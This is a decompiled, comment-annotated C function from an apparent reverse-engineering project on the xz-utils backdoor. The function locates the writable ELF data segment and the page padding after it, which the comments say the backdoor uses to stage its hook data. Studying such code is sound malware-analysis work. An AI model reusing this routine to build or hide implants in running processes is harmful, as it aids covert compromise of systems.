// /home/kali/xzre-ghidra/xzregh/102150_elf_get_data_segment.c
// Function: elf_get_data_segment @ 0x102150
// Calling convention: __stdcall
// Prototype: void * __stdcall elf_get_data_segment(elf_info_t * elf_info, u64 * pSize, BOOL get_alignment)


/*
 * AutoDoc: Locates and caches the writable PT_LOAD that carries `.data` and `.bss`. Repeat callers reuse `data_segment_start/size` (or, when `get_alignment` is TRUE, the cached padding between the live data and the next page) so the expensive scan runs only once. On a cold call the helper walks every PT_LOAD with PF_W|PF_R, validates `p_memsz >= p_filesz`, converts the virtual range into a runtime pointer, page-aligns `[start,end)`, and retains the candidate whose aligned end sits highest in memory. The winner's file-backed end, zero-filled tail, and page-rounded padding are stored in `elf_info_t` and returned through `pSize` so later hooks can either reach `.data` or carve out the staging padding for `backdoor_hooks_data_t`.
 */
#include "xzre_types.h"

void * elf_get_data_segment(elf_info_t *elf_info,u64 *pSize,BOOL get_alignment)

{
  Elf64_Ehdr *elfbase;
  BOOL data_segment_found;
  ulong selected_segment_index;
  Elf64_Phdr *phdr;
  void *filebacked_end;
  void *cached_data_start;
  u64 padding_length;
  ulong selected_segment_start;
  ulong segment_runtime_start;
  void *segment_mem_end_ptr;
  ulong phdr_index;
  ulong segment_runtime_end;
  u64 selected_segment_span;
  
  cached_data_start = (void *)elf_info->data_segment_start;
  elfbase = elf_info->elfbase;
  // AutoDoc: Fast path: reuse the cached `.data` pointer/span or, when asked, hand back the already measured padding window.
  if (cached_data_start != (void *)0x0) {
    if (get_alignment != FALSE) {
      padding_length = elf_info->data_segment_padding;
      *pSize = padding_length;
      cached_data_start = (void *)((long)cached_data_start - padding_length);
      if (padding_length == 0) {
        cached_data_start = (void *)0x0;
      }
      return cached_data_start;
    }
    *pSize = elf_info->data_segment_size;
    return cached_data_start;
  }
  data_segment_found = FALSE;
  selected_segment_span = 0;
  selected_segment_start = 0;
  selected_segment_index = 0;
  // AutoDoc: Walk every PF_W|PF_R PT_LOAD, aligning `[start,end)` and tracking the segment whose aligned end extends the farthest.
  for (phdr_index = 0; (uint)phdr_index < (uint)(ushort)elf_info->phdr_count; phdr_index = phdr_index + 1) {
    phdr = elf_info->phdrs + phdr_index;
    if ((phdr->p_type == 1) && ((phdr->p_flags & 7) == 6)) {
      if (phdr->p_memsz < phdr->p_filesz) {
        return (void *)0x0;
      }
      segment_runtime_start = (long)elfbase + (phdr->p_vaddr - elf_info->load_base_vaddr);
      segment_runtime_end = phdr->p_memsz + segment_runtime_start;
      segment_runtime_start = segment_runtime_start & 0xfffffffffffff000;
      if ((segment_runtime_end & 0xfff) != 0) {
        segment_runtime_end = (segment_runtime_end & 0xfffffffffffff000) + 0x1000;
      }
      if (data_segment_found) {
        if (selected_segment_start + selected_segment_span < segment_runtime_end) {
          selected_segment_span = segment_runtime_end - segment_runtime_start;
          selected_segment_index = phdr_index & 0xffffffff;
          selected_segment_start = segment_runtime_start;
        }
      }
      else {
        selected_segment_span = segment_runtime_end - segment_runtime_start;
        data_segment_found = TRUE;
        selected_segment_index = phdr_index & 0xffffffff;
        selected_segment_start = segment_runtime_start;
      }
    }
  }
  if (data_segment_found) {
    phdr = elf_info->phdrs;
    selected_segment_span = phdr[selected_segment_index].p_vaddr - elf_info->load_base_vaddr;
    segment_mem_end_ptr = (void *)((long)elfbase + phdr[selected_segment_index].p_memsz + selected_segment_span);
    filebacked_end = (void *)((long)elfbase + phdr[selected_segment_index].p_filesz + selected_segment_span);
    cached_data_start = segment_mem_end_ptr;
    if (((ulong)segment_mem_end_ptr & 0xfff) != 0) {
      cached_data_start = (void *)(((ulong)segment_mem_end_ptr & 0xfffffffffffff000) + 0x1000);
    }
    // AutoDoc: Once the candidate is known, compute the file-backed end, the `.bss` tail, and the padding up to the next page boundary.
    padding_length = (long)cached_data_start - (long)segment_mem_end_ptr;
    elf_info->data_segment_start = (u64)filebacked_end;
    elf_info->data_segment_padding = padding_length;
    elf_info->data_segment_size = (long)cached_data_start - (long)filebacked_end;
    if (get_alignment == FALSE) {
      *pSize = (long)cached_data_start - (long)filebacked_end;
      return filebacked_end;
    }
    *pSize = padding_length;
    if (padding_length != 0) {
      return segment_mem_end_ptr;
    }
  }
  return (void *)0x0;
}

